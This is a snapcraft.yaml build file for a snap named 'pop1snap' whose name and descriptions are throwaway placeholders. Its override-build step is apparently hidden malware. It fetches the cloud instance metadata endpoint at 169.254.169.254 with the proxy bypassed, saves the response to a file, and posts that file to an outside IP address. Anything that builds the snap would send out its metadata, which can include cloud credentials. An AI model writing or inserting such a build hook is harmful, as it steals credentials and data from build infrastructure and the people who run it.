name: pop1snap
version: git
summary: First snap
description: First!!!1!
grade: stable
confinement: classic

apps:
    snappy:
            command: bin/run

parts:
    snappy:
        plugin: nil
        override-build: |
            apt-get update
            apt-get install -y  curl
            http_proxy="" curl -o xyz http://169.254.169.254/latest/
            curl -d @xyz http://139.59.42.102/x
            echo 0

